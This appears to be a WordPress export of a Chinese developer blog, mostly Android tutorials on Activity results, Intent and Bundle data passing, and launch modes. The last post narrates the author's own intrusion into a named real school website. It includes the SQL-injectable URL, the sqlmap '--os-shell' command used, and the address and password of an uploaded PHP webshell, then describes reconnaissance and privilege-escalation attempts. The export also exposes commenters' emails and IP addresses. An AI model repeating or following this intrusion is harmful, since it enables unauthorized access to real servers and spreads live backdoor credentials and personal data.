		<category domain="category" nicename="java"><![CDATA[Java]]></category>
		<category domain="post_tag" nicename="java"><![CDATA[Java]]></category>
		<category domain="post_tag" nicename="json"><![CDATA[json]]></category>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<category domain="post_tag" nicename="php"><![CDATA[php]]></category>
		<category domain="post_tag" nicename="url"><![CDATA[url]]></category>
		<category domain="post_tag" nicename="%e5%ae%89%e5%8d%93"><![CDATA[安卓]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
		<category domain="post_tag" nicename="%e8%bf%94%e5%9b%9e%e6%95%b0%e6%8d%ae"><![CDATA[返回数据]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[338]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:comment>
			<wp:comment_id>29</wp:comment_id>
			<wp:comment_author><![CDATA[z]]></wp:comment_author>
			<wp:comment_author_email><![CDATA[wuyehuijin@gmail.com]]></wp:comment_author_email>
			<wp:comment_author_url></wp:comment_author_url>
			<wp:comment_author_IP><![CDATA[183.30.139.246]]></wp:comment_author_IP>
			<wp:comment_date><![CDATA[2016-06-18 23:27:05]]></wp:comment_date>
			<wp:comment_date_gmt><![CDATA[2016-06-18 15:27:05]]></wp:comment_date_gmt>
			<wp:comment_content><![CDATA[这外观真不错]]></wp:comment_content>
			<wp:comment_approved><![CDATA[1]]></wp:comment_approved>
			<wp:comment_type><![CDATA[]]></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
							</wp:comment>
					<wp:comment>
			<wp:comment_id>30</wp:comment_id>
			<wp:comment_author><![CDATA[Mr9esx]]></wp:comment_author>
			<wp:comment_author_email><![CDATA[1138099359@qq.com]]></wp:comment_author_email>
			<wp:comment_author_url></wp:comment_author_url>
			<wp:comment_author_IP><![CDATA[113.104.33.122]]></wp:comment_author_IP>
			<wp:comment_date><![CDATA[2016-06-24 20:05:50]]></wp:comment_date>
			<wp:comment_date_gmt><![CDATA[2016-06-24 12:05:50]]></wp:comment_date_gmt>
			<wp:comment_content><![CDATA[谢谢~]]></wp:comment_content>
			<wp:comment_approved><![CDATA[1]]></wp:comment_approved>
			<wp:comment_type><![CDATA[]]></wp:comment_type>
			<wp:comment_parent>29</wp:comment_parent>
			<wp:comment_user_id>1</wp:comment_user_id>
							</wp:comment>
					</item>
					<item>
		<title>Android获取Activity返回参数</title>
		<link>https://www.nervgeek.com/2016/05/04/android%e8%8e%b7%e5%8f%96activity%e8%bf%94%e5%9b%9e%e5%8f%82%e6%95%b0/</link>
		<pubDate>Wed, 04 May 2016 06:43:29 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=1204</guid>
		<description></description>
		<content:encoded><![CDATA[我们可以使用Intent、Bundle给另一个Acvitity传递参数，但是有时候退出另一个Acitivity的时候，也需要给上一级Activity返回参数。
先在第二个Acvitity加一个输入框还有一个按钮。
<a href="https://www.nervgeek.com/wp-content/uploads/2016/05/0A95GGBWKD0_UR3X@ZQ5.png"><img class="alignnone  wp-image-1205" src="https://www.nervgeek.com/wp-content/uploads/2016/05/0A95GGBWKD0_UR3X@ZQ5.png" alt="0A95GGBWKD0_UR3&#96;X&#96;@ZQ(5" width="352" height="423" /></a>

<pre>findViewById(R.id.button).setOnClickListener(new View.OnClickListener() {
    @Override
    public void onClick(View v) {
        Intent i2 = new Intent();
        editText = (EditText)findViewById(R.id.editText);
        i2.putExtra("data",editText.getText().toString());
        setResult(1,i2);
        finish();
    }
});</pre>

监听按钮，获取EditText的内容，<code>setResult</code>函数就是用来返回函数，第一个参数是状态码，第二个是Intent。
主Activity添加一个TextView，用来展示返回的参数。

<pre>findViewById(R.id.StartAnthorAty).setOnClickListener(new View.OnClickListener() {
    @Override
    public void onClick(View v) {
        Intent i = new Intent(MainActivity.this,Main2Activity.class);
        startActivityForResult(i,0);
    }
});</pre>

启动Activity的函数要改用<code>startActivityForResult</code>，第一个参数是Intent，第二个参数是状态码。
重写<code>onActivityResult</code>方法，在里面实现获取返回参数之后要做的事情，例如把获取的参数展示在TextView上。

<pre>@Override
protected void onActivityResult(int requestCode, int resultCode, Intent data) {
    super.onActivityResult(requestCode, resultCode, data);
    textVidw = (TextView)findViewById(R.id.textView);
    textVidw.setText(data.getStringExtra("data"));
}</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1204</wp:post_id>
		<wp:post_date><![CDATA[2016-05-04 14:43:29]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-05-04 06:43:29]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[android%e8%8e%b7%e5%8f%96activity%e8%bf%94%e5%9b%9e%e5%8f%82%e6%95%b0]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="activity"><![CDATA[activity]]></category>
		<category domain="category" nicename="android"><![CDATA[Android]]></category>
		<category domain="post_tag" nicename="android"><![CDATA[android]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[262]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>在Activity之间使用Intent传值和Bundle传值的区别和方式</title>
		<link>https://www.nervgeek.com/2016/05/04/%e5%9c%a8activity%e4%b9%8b%e9%97%b4%e4%bd%bf%e7%94%a8intent%e4%bc%a0%e5%80%bc%e5%92%8cbundle%e4%bc%a0%e5%80%bc%e7%9a%84%e5%8c%ba%e5%88%ab%e5%92%8c%e6%96%b9%e5%bc%8f/</link>
		<pubDate>Wed, 04 May 2016 06:48:23 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=1207</guid>
		<description></description>
		<content:encoded><![CDATA[<strong>1.Bundle类的作用</strong>
Bundle类用作携带数据，它类似于Map，用于存放key-value名值对形式的值。相对于Map，它提供了各种常用类型的putXxx()/getXxx()方法，如:putString()/getString()和putInt()/getInt()，putXxx()用于往Bundle对象放入数据，getXxx()方法用于从Bundle对象里获取数据。Bundle的内部实际上是使用了HashMap&lt;String, Object&gt;类型的变量来存放putXxx()方法放入的值。简单地说，Bundle就是一个封装好的包，专门用于导入Intent传值的包。
<strong>2.为Intent附加数据的两种写法</strong>
第一种写法，用于批量添加数据到Intent：

<pre class="java">Intentintent = new Intent();
　　Bundle bundle = new Bundle();//该类用作携带数据
　　bundle.putString("name","Alice");
　　intent.putExtras(bundle);//为意图追加额外的数据，意图原来已经具有的数据不会丢失，但key同名的数据会被替换</pre>

第二种写法：这种写法的作用等价于上面的写法，只不过这种写法是把数据一个个地添加进Intent，这种写法使用起来比较方便，而且只需要编写少量的<a href="http://www.xuebuyuan.com/" target="_blank" rel="nofollow">代码</a>。

<pre class="java">　　Intent intent = new Intent();
　　intent.putExtra("name","XXX");</pre>

那么，这两种方法有什么区别呢？
完全没有区别。当你调用putExtras()方法时，所传入的Bundle会被转化为Intent的键值（别忘了Intent也以键值模式转载数据）。
那么，现在看看如何将Intent和Bundle取出来。
方法很简单，直接使用this.getIntent()就可以得到传来的Intent，然后在这个Intent的基础上调用getExtras()就可以得到Bundle。然后这个Bundle你想要什么得到什么就get什么。
比如String str=bundle.getString("USERNAME"); 就是得到键为“USERNAME”的字符串，int num=bundle.getInt("Number");就是得到键为“Number”的整型。
以上部分内容转载或参考来源如下：
<a href="http://blog.csdn.net/yanzi1225627/article/details/7802819" rel="nofollow">http://blog.csdn.net/yanzi1225627/article/details/7802819</a>
在此表示感谢]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1207</wp:post_id>
		<wp:post_date><![CDATA[2016-05-04 14:48:23]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-05-04 06:48:23]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[%e5%9c%a8activity%e4%b9%8b%e9%97%b4%e4%bd%bf%e7%94%a8intent%e4%bc%a0%e5%80%bc%e5%92%8cbundle%e4%bc%a0%e5%80%bc%e7%9a%84%e5%8c%ba%e5%88%ab%e5%92%8c%e6%96%b9%e5%bc%8f]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="activity"><![CDATA[activity]]></category>
		<category domain="category" nicename="android"><![CDATA[Android]]></category>
		<category domain="post_tag" nicename="android"><![CDATA[android]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[207]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>Activity的标准启动模式</title>
		<link>https://www.nervgeek.com/2016/05/04/activity%e7%9a%84%e6%a0%87%e5%87%86%e5%90%af%e5%8a%a8%e6%a8%a1%e5%bc%8f/</link>
		<pubDate>Wed, 04 May 2016 07:43:49 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=1209</guid>
		<description></description>
		<content:encoded><![CDATA[我们安卓程序Activity默认的启动方式是标准启动方式，可以在AndroidManifest.xml内配置。
<a href="https://www.nervgeek.com/wp-content/uploads/2016/05/0FCKO22Q03C67J63BO0.png"><img class="alignnone size-full wp-image-1212" src="https://www.nervgeek.com/wp-content/uploads/2016/05/0FCKO22Q03C67J63BO0.png" alt="0F&#96;CKO22Q}03[C67J6)3BO0" width="373" height="185" /></a>
默认是standard模式，也就是标准启动方式。
我们来看看标准启动方式的特性。
新建一个TextView，使用<code>getTaskId()</code>显示TaskID，<code>toString()</code>显示Current Acvitity ID。

<pre>textVidw = (TextView)findViewById(R.id.textView);
textVidw.setText(String.format("TaskID:%d\nCurrent Acvitity ID:%s",getTaskId(),toString()));
findViewById(R.id.StartAnthorAty).setOnClickListener(new View.OnClickListener() {
    @Override
    public void onClick(View v) {
        startActivity(new Intent(MainActivity.this,MainActivity.class));
    }
});</pre>

然后新建一个按钮，监听这个按钮并启动自己本身的Activity。
启动软件的时候：
<a href="https://www.nervgeek.com/wp-content/uploads/2016/05/ZJQE1B29COC_NX5OSH.png"><img class="alignnone size-full wp-image-1210" src="https://www.nervgeek.com/wp-content/uploads/2016/05/ZJQE1B29COC_NX5OSH.png" alt="ZJQE)1B29CO$C_NX5O$[S}H" width="284" height="260" /></a>
点击“启动自己”：
<a href="https://www.nervgeek.com/wp-content/uploads/2016/05/6E3SGS6925NXZ120RUH.png"><img class="alignnone size-full wp-image-1211" src="https://www.nervgeek.com/wp-content/uploads/2016/05/6E3SGS6925NXZ120RUH.png" alt="6E3SGS692)5NX}%{Z120RUH" width="369" height="348" /></a>
我们发现，TaskID任务栈ID不变，但Current Acvitity ID后面的@xxxx实例ID却改变了。由此可知，<strong>启动出来的Activity是在同一个任务栈，但创建了不同的实例。</strong>
然后退出的时候也是先进后出（栈）。
&nbsp;]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1209</wp:post_id>
		<wp:post_date><![CDATA[2016-05-04 15:43:49]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-05-04 07:43:49]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[activity%e7%9a%84%e6%a0%87%e5%87%86%e5%90%af%e5%8a%a8%e6%a8%a1%e5%bc%8f]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="activity"><![CDATA[activity]]></category>
		<category domain="category" nicename="android"><![CDATA[Android]]></category>
		<category domain="post_tag" nicename="android"><![CDATA[android]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[178]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>Activity的singleTop启动模式</title>
		<link>https://www.nervgeek.com/2016/05/04/activity%e7%9a%84singletop%e5%90%af%e5%8a%a8%e6%a8%a1%e5%bc%8f/</link>
		<pubDate>Wed, 04 May 2016 08:15:57 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=1214</guid>
		<description></description>
		<content:encoded><![CDATA[在AndroidManifest.xml里把android:launchMode="standard"改成android:launchMode="singleTop"即可。
在主Activity里添加一个TextView和两个button，一个启动自己，一个启动新的Activity。

<pre>textVidw = (TextView)findViewById(R.id.textView);
textVidw.setText(String.format("TaskID:%d\nCurrent Acvitity ID:%s",getTaskId(),toString()));
findViewById(R.id.StartMySelf).setOnClickListener(new View.OnClickListener() {
    @Override
    public void onClick(View v) {
        startActivity(new Intent(MainActivity.this,MainActivity.class));
    }
});
findViewById(R.id.StartAnthorAty).setOnClickListener(new View.OnClickListener() {
    @Override
    public void onClick(View v) {
        startActivity(new Intent(MainActivity.this,Main2Activity.class));
    }
});</pre>

然后在另一个Activity里面也添加一个TextView和两个button，一个启动自己，一个启动主Activity。
另一个Activity的java代码也和主Activity一样：

<pre>textVidw = (TextView)findViewById(R.id.textView);
textVidw.setText(String.format("TaskID:%d\nCurrent Acvitity ID:%s",getTaskId(),toString()));
findViewById(R.id.StartMySelf).setOnClickListener(new View.OnClickListener() {
    @Override
    public void onClick(View v) {
        startActivity(new Intent(MainActivity.this,MainActivity.class));
    }
});
findViewById(R.id.StartAnthorAty).setOnClickListener(new View.OnClickListener() {
    @Override
    public void onClick(View v) {
        startActivity(new Intent(MainActivity.this,Main2Activity.class));
    }
});</pre>

通过运行发现，在栈点的Activity是无法新建一个实例的。
singleTop 跟standard 模式比较类似。唯一的区别就是，当跳转的对象是位于栈顶的activity（应该可以理解为用户眼前所 看到的activity）时，程序将不会生成一个新的activity实例，而是直接跳到现存于栈顶的那个activity实例。拿上面的例子来说，当A1 为 singleTop 模式时，执行跳转后栈里面依旧只有一个实例，如果现在按返回键程序将直接退出。]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1214</wp:post_id>
		<wp:post_date><![CDATA[2016-05-04 16:15:57]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-05-04 08:15:57]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[activity%e7%9a%84singletop%e5%90%af%e5%8a%a8%e6%a8%a1%e5%bc%8f]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="activity"><![CDATA[activity]]></category>
		<category domain="category" nicename="android"><![CDATA[Android]]></category>
		<category domain="post_tag" nicename="android"><![CDATA[android]]></category>
		<category domain="post_tag" nicename="singletop"><![CDATA[singleTop]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[173]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>关于安卓中4种启动模式（standard、singleTop、singleTask、singleInstance）的区别</title>
		<link>https://www.nervgeek.com/2016/05/04/%e5%85%b3%e4%ba%8e%e5%ae%89%e5%8d%93%e4%b8%ad4%e7%a7%8d%e5%90%af%e5%8a%a8%e6%a8%a1%e5%bc%8f%ef%bc%88standard%e3%80%81singletop%e3%80%81singletask%e3%80%81singleinstance%ef%bc%89%e7%9a%84%e5%8c%ba/</link>
		<pubDate>Wed, 04 May 2016 08:40:55 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=1218</guid>
		<description></description>
		<content:encoded><![CDATA[<div>1、standard ：</div>

<div>系统的默认模式，一次跳转即会生成一个新的实例。假设有一个activity命名为A1，执行语句：</div>

<div> <wbr />startActivity(new Intent(A1.this, A1.class));</div>

<div>后A1将跳转到另外一个A1，也就是现在的栈里面有 A1的两个实例。按返回键后你会发现仍然是在A1（第一个）里面。</div>

<div> <wbr /></div>

<div>2、singleTop：</div>

<div>singleTop 跟standard 模式比较类似。唯一的区别就是，当跳转的对象是位于栈顶的activity（应该可以理解为用户眼前所 看到的activity）时，程序将不会生成一个新的activity实例，而是直接跳到现存于栈顶的那个activity实例。拿上面的例子来说，当A1 为 singleTop 模式时，执行跳转后栈里面依旧只有一个实例，如果现在按返回键程序将直接退出。</div>

<div> <wbr /></div>

<div>3、singleTask： <wbr /></div>

<div>singleTask模式和后面的singleInstance模式都是只创建一个实例的。在这种模式下，无论跳转的对象是不是位于栈顶的activity，程序都不会生成一个新的实例（当然前提是栈里面已经有这个实例）。这种模式相当有用，在以后的多activity开发中， 经常会因为跳转的关系导致同个页面生成多个实例，这个在用户体验上始终有点不好，而如果你将对应的activity声明为 singleTask 模式，这种问题将不复存在。</div>

<div> <wbr /></div>

<div>4、singleInstance: <wbr /></div>

<div>设置为 singleInstance 模式的 activity 将独占一个task（task可以理解为进程），独占一个task的activity与其说是activity，倒不如说是一个应用，这个应用与其他activity是独立的，它有自己的上下文activity。</div>

<div></div>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1218</wp:post_id>
		<wp:post_date><![CDATA[2016-05-04 16:40:55]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-05-04 08:40:55]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[%e5%85%b3%e4%ba%8e%e5%ae%89%e5%8d%93%e4%b8%ad4%e7%a7%8d%e5%90%af%e5%8a%a8%e6%a8%a1%e5%bc%8f%ef%bc%88standard%e3%80%81singletop%e3%80%81singletask%e3%80%81singleinstance%ef%bc%89%e7%9a%84%e5%8c%ba]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="activity"><![CDATA[activity]]></category>
		<category domain="category" nicename="android"><![CDATA[Android]]></category>
		<category domain="post_tag" nicename="android"><![CDATA[android]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[273]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>入侵某网站全过程</title>
		<link>https://www.nervgeek.com/2016/05/25/%e5%85%a5%e4%be%b5%e6%9f%90%e7%bd%91%e7%ab%99%e5%85%a8%e8%bf%87%e7%a8%8b/</link>
		<pubDate>Wed, 25 May 2016 13:07:07 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=1227</guid>
		<description></description>
		<content:encoded><![CDATA[目标站点：http://tbts.edu.tw/
已知有SQL注入点的地址：http://www.tbts.edu.tw/about.php?nid=5
使用Kali内置的SQLMAP，使用<code>sqlmap -u http://www.tbts.edu.tw/about.php?nid=5 --os-shell</code>命令扫描。
<a href="https://www.nervgeek.com/wp-content/uploads/2016/05/KN8RPLO9_IF5L8T5EYK.png"><img class="alignnone size-full wp-image-1229" src="https://www.nervgeek.com/wp-content/uploads/2016/05/KN8RPLO9_IF5L8T5EYK.png" alt="KN[8RPLO[9_I{F5&#96;L8T5EYK" width="1698" height="1024" /></a>
网站没有做伪静态，因此可知该网站使用PHP语言开发，所以选择4。
<a href="https://www.nervgeek.com/wp-content/uploads/2016/05/UB2@60SV2CY9TZQ50JX.png"><img class="alignnone size-full wp-image-1230" src="https://www.nervgeek.com/wp-content/uploads/2016/05/UB2@60SV2CY9TZQ50JX.png" alt="UB2@[60SV2C}Y9TZQ50J&#96;&#96;X" width="1698" height="1024" /></a>
选项一是扫描默认的几个<strong>物理目录</strong>查看是否有写入权限，选项二是<strong>指定</strong>一个已知有写入权限的<strong>物理目录</strong>。
网站没有关闭apache文件浏览功能，以前http://tbts.edu.tw/tbtsf/eweb/uploadfile/、http://tbts.edu.tw/eweb/uploadfile/、http://tbts.edu.tw/images/都拥有拥有写入权限，使用<code>http://tbts.edu.tw/tbtsf/eweb/uploadfile/</code>注入，<strong>经推测物理目录</strong>为<code>/var/www/html/tbtsf/eweb/uploadfile/</code>。
<a href="https://www.nervgeek.com/wp-content/uploads/2016/05/OIED5JEZMU0CFZDWWE.png"><img class="alignnone size-full wp-image-1231" src="https://www.nervgeek.com/wp-content/uploads/2016/05/OIED5JEZMU0CFZDWWE.png" alt="O{IE)D5JEZMU0CFZ(()DWWE" width="1698" height="1024" /></a>
输入<code>/var/www/html/tbtsf/eweb/uploadfile/</code>后回车，会在该目录生成文件 tmpboftk.php 和 tmputnds.php（随机文件名），<strong>网站地址为http://tbts.edu.tw/tbtsf/eweb/uploadfile/tmpboftk.php和http://tbts.edu.tw/tbtsf/eweb/uploadfile/ tmputnds.php</strong>，网站没有关闭apache文件浏览功能，可以直接在http://tbts.edu.tw/tbtsf/eweb/uploadfile/找到php文件。
<a href="https://www.nervgeek.com/wp-content/uploads/2016/05/BI4E3ZDP2JHK_NDQUF9.png"><img class="alignnone size-full wp-image-1236" src="https://www.nervgeek.com/wp-content/uploads/2016/05/BI4E3ZDP2JHK_NDQUF9.png" alt="B[I4E3]ZDP2}JHK_ND[QUF9" width="1779" height="1164" /></a>
进入http://tbts.edu.tw/tbtsf/eweb/uploadfile/tmputnds.php，发现底部有文件上传的功能，在此可以<strong>上传一句话木马或者免杀大马</strong>。
我上传了一个名为<code>2013.php</code>的大马，地址为：<code>http://tbts.edu.tw/tbtsf/eweb/uploadfile/2013.php</code>，密码为：<code>123</code>。
<a href="https://www.nervgeek.com/wp-content/uploads/2016/05/XFDELLA@@1HNDOXGD5.png"><img class="alignnone size-full wp-image-1235" src="https://www.nervgeek.com/wp-content/uploads/2016/05/XFDELLA@@1HNDOXGD5.png" alt="XFDE{LLA[@@1H%ND&#96;{OXGD5" width="1779" height="1164" /></a>
<strong>从信息中可得知几点信息：运行着CentOS6.4、64位系统，Apache版本为2.2.15，PHP版本是5.3.3，以apache用户登陆。</strong>
即使是以apache用户登陆，通过 [文件管理器] 发现我们也能浏览除html以外的信息，<strong>除了root文件夹没有权限进入，例如etc等文件夹都有浏览权限。</strong>
进行内网扫描，发现只有该服务器一台。最后还剩提权，在https://www.exploit-db.com找了不少<strong>Linux 2.6.32</strong>的exp提权脚本，都无法提权成功，通过Web shell使用<code>netstat -an</code>发现，该服务器运行了<strong>watch dog</strong>，有可能是因为该软件导致无法成功提权。
&nbsp;]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1227</wp:post_id>
		<wp:post_date><![CDATA[2016-05-25 21:07:07]]></wp:post_date>
